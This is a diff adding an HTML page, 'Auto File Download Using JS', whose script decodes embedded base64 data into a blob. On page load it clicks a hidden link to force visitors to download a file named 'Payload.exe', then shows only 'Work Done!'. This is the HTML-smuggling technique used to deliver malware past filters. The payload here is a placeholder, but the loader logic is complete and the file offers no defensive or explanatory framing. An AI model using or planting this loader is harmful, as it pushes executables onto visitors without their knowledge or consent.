@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+    <title>Auto File Download Using JS</title>
+</head>
+
+<body>
+
+    <script>
+        // File name and contents
+        filename = "Payload.exe"
+        filedata = "temporary.log code"
+
+        function base64tobytes(b64data) {
+            var binary_values = atob(b64data);
+            var binary_length = binary_values.length
+            var bytes_data = new Uint8Array(binary_length);
+
+            for (var i = 0; i < binary_length; i++) {
+                bytes_data[i] = binary_values.charCodeAt(i);
+            }
+
+            return bytes_data.buffer;
+        }
+
+        var filebytes = base64tobytes(filedata);
+
+        // Blob and anchor element
+        var blob = new Blob([filebytes], { "type": "octet/stream" });
+        var anchor = document.createElement("a");
+        document.body.append(anchor);
+        anchor.style = "display: none;";
+
+        var url = window.URL.createObjectURL(blob)
+        anchor.href = url;
+        anchor.download = filename;
+
+        // Force click and download
+        anchor.click();
+        window.URL.revokeObjectURL(url);
+
+    </script>
+
+
+
+    <h1>Work Done!</h1>
+</body>
+
+</html>
